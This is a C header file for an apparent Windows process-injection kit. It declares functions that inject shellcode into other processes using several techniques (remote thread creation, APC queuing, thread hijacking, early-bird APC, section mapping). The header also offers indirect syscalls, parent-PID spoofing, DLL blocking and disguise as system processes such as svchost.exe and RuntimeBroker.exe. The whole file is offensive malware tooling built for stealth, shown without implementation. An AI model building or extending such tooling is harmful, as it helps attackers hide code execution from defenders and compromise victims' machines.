/*
 * inject.h — Process injection kit.
 *
 * Multiple injection techniques selectable at runtime via INJECT_TECHNIQUE.
 * All techniques use indirect syscalls (syscalls_wrappers.h) when available.
 *
 * Techniques:
 *   INJECT_CREATETHREAD     — NtCreateThreadEx in remote process (classic)
 *   INJECT_APC_QUEUE        — QueueUserAPC to alertable thread
 *   INJECT_THREAD_HIJACK    — Suspend → GetContext → SetContext RIP → Resume
 *   INJECT_EARLY_BIRD       — Create suspended process → APC before main thread runs
 *   INJECT_SECTION_MAP      — NtCreateSection + NtMapViewOfSection (shared memory)
 *
 * All techniques follow the same flow:
 *   1. Allocate memory in target (or map shared section)
 *   2. Write payload
 *   3. Set execute permission
 *   4. Trigger execution
 *   5. Optionally wait for completion
 *   6. Cleanup
 */
#ifndef INJECT_H
#define INJECT_H

#include <windows.h>

typedef enum _INJECT_TECHNIQUE {
    INJECT_CREATETHREAD   = 0,
    INJECT_APC_QUEUE      = 1,
    INJECT_THREAD_HIJACK  = 2,
    INJECT_EARLY_BIRD     = 3,
    INJECT_SECTION_MAP    = 4,
} INJECT_TECHNIQUE;

typedef struct _INJECT_OPTS {
    INJECT_TECHNIQUE technique;
    DWORD   targetPid;          /* 0 = self-inject */
    HANDLE  hProcess;           /* If already opened; NULL = will open */
    HANDLE  hThread;            /* For THREAD_HIJACK: specific thread handle */
    BOOL    ppidSpoof;          /* For EARLY_BIRD: spoof parent PID */
    DWORD   spoofPid;           /* Parent PID to spoof */
    BOOL    blockDlls;          /* Block non-MS DLLs in child */
    const wchar_t *spawnTo;    /* For EARLY_BIRD: process to spawn (e.g. "svchost.exe") */
    BOOL    waitForCompletion;  /* Wait for payload to finish */
    DWORD   timeoutMs;          /* Timeout for wait (0 = infinite) */
} INJECT_OPTS;

typedef struct _INJECT_RESULT {
    BOOL    success;
    HANDLE  hProcess;           /* Handle to target process (caller may need to close) */
    HANDLE  hThread;            /* Handle to created/hijacked thread */
    void   *remoteBase;         /* Base address of payload in target */
    DWORD   lastError;          /* GetLastError or NTSTATUS on failure */
    char    errorMsg[256];      /* Human-readable error description */
} INJECT_RESULT;

/*
 * Inject shellcode/payload into a target process.
 *
 * payload:     raw bytes to inject
 * payloadLen:  size in bytes
 * opts:        injection options
 * result:      output — must be zeroed by caller
 *
 * Returns TRUE on success.
 * Caller is responsible for closing result->hProcess and result->hThread.
 */
BOOL inject_shellcode(
    const unsigned char *payload,
    SIZE_T payloadLen,
    INJECT_OPTS *opts,
    INJECT_RESULT *result
);

/*
 * Convenience: inject and execute, then cleanup handles.
 * For fire-and-forget injection.
 */
BOOL inject_and_forget(
    const unsigned char *payload,
    SIZE_T payloadLen,
    INJECT_OPTS *opts
);

/* Default spawn-to process path */
#define INJECT_DEFAULT_SPAWNTOP L"C:\\Windows\\System32\\RuntimeBroker.exe"

#endif /* INJECT_H */
